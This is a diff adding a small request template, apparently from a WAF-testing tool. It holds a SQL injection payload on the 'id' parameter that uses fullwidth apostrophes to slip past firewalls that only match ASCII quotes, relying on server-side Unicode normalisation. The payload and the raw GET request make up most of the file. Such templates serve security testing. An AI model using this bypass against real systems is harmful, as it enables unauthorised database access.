@@ -1,0 +1,13 @@
+# @name: 全角单引号归一化绕过
+# @tags: get,sqli,unicode,fullwidth,normalize,id,bypass
+# @color: teal
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: unicode_fullwidth_quote
+# @intent.param: id
+# @intent.payload: id=1＇and＇a＇=＇a
+# @note: 全角单引号 ＇(U+FF07) 替代半角引号，绕过仅匹配 ASCII 引号的 WAF，依赖后端 NFKC 归一化还原(Python/Java/部分 CMS 应用层)。
+GET /?id=1＇and＇a＇=＇a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
